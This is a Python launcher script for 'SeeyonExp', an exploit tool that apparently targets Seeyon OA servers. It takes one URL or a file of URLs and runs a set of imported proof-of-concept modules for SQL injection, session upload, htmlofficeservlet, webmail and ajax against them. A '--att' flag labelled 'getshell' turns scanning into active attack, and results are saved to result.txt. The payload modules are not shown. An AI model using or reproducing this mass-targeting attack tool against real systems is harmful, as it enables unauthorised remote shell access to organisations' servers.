# -*- coding: utf-8 -*-

import os
from pyfiglet import Figlet
from optparse import OptionParser
from poc import webmail,session_upload,getSessionList,information,sql,htmlofficeservlet,ajax

if __name__ == '__main__':
	# os.system('@echo off')
	os.system('chcp 936 >nul')
	f=Figlet(font='slant')
	print('\033[31m====================================================\033[0m')
	print('\033[34m{}\033[0m'.format(f.renderText('SeeyonExp')))
	print('   \033[33mAuthor:Summer    ver:1.0    time:2021-06-02\033[0m')
	print('\033[31m====================================================\033[0m'+'\n')
	usage="\n"+"python3 %prog -u url"+"\n"+"python3 %prog -u url --att"+"\n"+"python3 %prog -f url.txt"+"\n"+"python3 %prog -f url.txt --att"
	parser=OptionParser(usage=usage)
	parser.add_option('-u','--url',dest='url',help="target url")
	parser.add_option('-f','--file',dest='file',help="url file")
	parser.add_option('--att',dest='attack',default=False,action='store_true',help="getshell")
	(options,args)=parser.parse_args()
	if options.file:
		f=open(options.file,'r')
		urls=f.readlines()
		for url in urls:
			url=url.strip('\n')
			information.check(url)
			getSessionList.get_sessionlist(url)
			webmail.check(url)
			sql.run(url,options.attack)
			session_upload.get_session(url,options.attack)
			htmlofficeservlet.check(url,options.attack)
			ajax.check(url,options.attack)
		print('\033[34m[#]扫描已完成，结果保存至result.txt\033[0m')

	if options.url:
		information.check(options.url)
		getSessionList.get_sessionlist(options.url)
		webmail.check(options.url)
		sql.run(options.url,options.attack)
		session_upload.get_session(options.url,options.attack)
		htmlofficeservlet.check(options.url,options.attack)
		ajax.check(options.url,options.attack)
		print('\033[34m[#]扫描已完成，结果保存至result.txt\033[0m')
